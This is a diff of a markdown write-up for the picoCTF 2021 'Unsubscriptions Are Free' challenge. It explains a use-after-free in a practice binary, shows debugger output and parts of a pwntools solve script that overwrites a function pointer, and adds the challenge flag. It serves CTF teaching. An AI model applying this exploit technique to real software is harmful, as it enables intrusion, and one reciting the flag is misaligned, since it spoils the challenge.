@@ -1,10 +1,30 @@
+---
+name: Unsubscriptions Are Free (2021)
+event: Pico CTF 2021
+category: Pwn
+description: Writeup for Unsubscriptions Are Free (pwn) - Pico CTF (2021) 💜
+layout:
+    title:
+        visible: true
+    description:
+        visible: true
+    tableOfContents:
+        visible: false
+    outline:
+        visible: true
+    pagination:
+        visible: true
+---
+
 # Unsubscriptions Are Free
+
+## Video Walkthrough
 
 [![VIDEO WALKTHROUGH](https://img.youtube.com/vi/YGQAvJ__12k/0.jpg)](https://www.youtube.com/watch?v=YGQAvJ__12k "Unsubscriptions Are Free")
 
 ## Description
 
->Check out my new video-game and spaghetti-eating streaming channel on Twixer!
+> Check out my new video-game and spaghetti-eating streaming channel on Twixer!
 
 ## Source
 
@@ -164,18 +184,19 @@ int main() {
 
 Challenge name indicates a Use After Free (UAF) vulnerability.
 
->Use-After-Free (UAF) is a vulnerability related to incorrect use of dynamic memory during program operation.  If after freeing a memory location, a program does not clear the  pointer to that memory, an attacker can use the error to hack the  program.
+> Use-After-Free (UAF) is a vulnerability related to incorrect use of dynamic memory during program operation. If after freeing a memory location, a program does not clear the pointer to that memory, an attacker can use the error to hack the program.
 
-Goal is to call the `hahaexploitgobrrr` function, printing the flag. 
+Goal is to call the `hahaexploitgobrrr` function, printing the flag.
 
-`main()` first mallocs a `user` object* from the `cmd` struct, containing a function pointer `whatToDo` and a char pointer `username`.
+`main()` first mallocs a `user` object\* from the `cmd` struct, containing a function pointer `whatToDo` and a char pointer `username`.
 
 \*32-bit binary, so the two pointers are 4 bytes each, and you would assume `malloc(8)`. However, ghidra shows `malloc(4)` because the code uses `(cmd *)malloc(sizeof(user))` where `user` is a 4 byte pointer. However, when we debug the program, we see a 16-byte chunk is assigned, so `malloc(16)`.
 
 main() then indefinitely loops:
-- `printMenu()` - print menu options
-- `processInput()` - read user input
-- `doProcess(user)` - execute the current function pointed to by `user->whatToDo`
+
+-   `printMenu()` - print menu options
+-   `processInput()` - read user input
+-   `doProcess(user)` - execute the current function pointed to by `user->whatToDo`
 
 When we select a menu option, e.g. `S` the `user->whatToDo` function pointer is updated, to point at the relevant function, e.g. `s`:
 
@@ -219,9 +240,9 @@ The **first breakpoint** shows the address of the `user` chunk (`0x95cd1a0`), re
    0x8048d74 <main+63>    mov    eax, user                     <0x804b060>
    0x8048d7a <main+69>    mov    dword ptr [eax], edx
    0x8048d7c <main+71>    call   printMenu                     <printMenu>
- 
+
    0x8048d81 <main+76>    call   processInput                     <processInput>
- 
+
    0x8048d86 <main+81>    mov    eax, user                     <0x804b060>
    0x8048d8c <main+87>    mov    eax, dword ptr [eax]
    0x8048d8e <main+89>    sub    esp, 0xc
@@ -284,15 +305,15 @@ otpyrc
  ► 0x8048aff <i+128>          add    esp, 0x10
    0x8048b02 <i+131>          jmp    i+151                     <i+151>
     ↓
-   0x8048b16 <i+151>          nop    
+   0x8048b16 <i+151>          nop
    0x8048b17 <i+152>          mov    eax, dword ptr [ebp - 0xc]
    0x8048b1a <i+155>          xor    eax, dword ptr gs:[0x14]
    0x8048b21 <i+162>          je     i+169                     <i+169>
     ↓
    0x8048b28 <i+169>          mov    ebx, dword ptr [ebp - 4]
-   0x8048b2b <i+172>          leave  
-   0x8048b2c <i+173>          ret    
- 
+   0x8048b2b <i+172>          leave
+   0x8048b2c <i+173>          ret
+
    0x8048b2d <printMenu>      push   ebp
    0x8048b2e <printMenu+1>    mov    ebp, esp
 ```
@@ -354,11 +375,11 @@ Size: 0x20dd9
    0x8048a6c <leaveMessage+75>    push   dword ptr [ebp - 0xc]
    0x8048a6f <leaveMessage+78>    push   0
    0x8048a71 <leaveMessage+80>    call   read@plt                     <read@plt>
- 
+
    0x8048a76 <leaveMessage+85>    add    esp, 0x10
-   0x8048a79 <leaveMessage+88>    nop    
+   0x8048a79 <leaveMessage+88>    nop
    0x8048a7a <leaveMessage+89>    mov    ebx, dword ptr [ebp - 4]
-   0x8048a7d <leaveMessage+92>    leave  
+   0x8048a7d <leaveMessage+92>    leave
 ```
 
 `malloc(8)` has returned `0x95cd1a0`, the same address as our previous chunk. Hence we are using-after-free when we write our message. We submit the leaked `hahaexploitgobrrr` function address, overwriting `user->whatToDo`. The infinite loop in main executes `doProcess(user)`, triggering the `hahaexploitgobrrr` function and printing the flag.
@@ -371,7 +392,8 @@ python exploit.py REMOTE mercury.picoctf.net 61817
 [*] Closed connection to mercury.picoctf.net port 61817
 ```
 
-## Solve Script
+## Solution
+
 ```py
 from pwn import *
 
@@ -431,3 +453,5 @@ io.sendlineafter(b':', flat(leak))
 # Got Flag?
 warn(io.recvlines(2)[1].decode())
 ```
+
+Flag: `picoCTF{d0ubl3_j30p4rdy_ba307b82}`
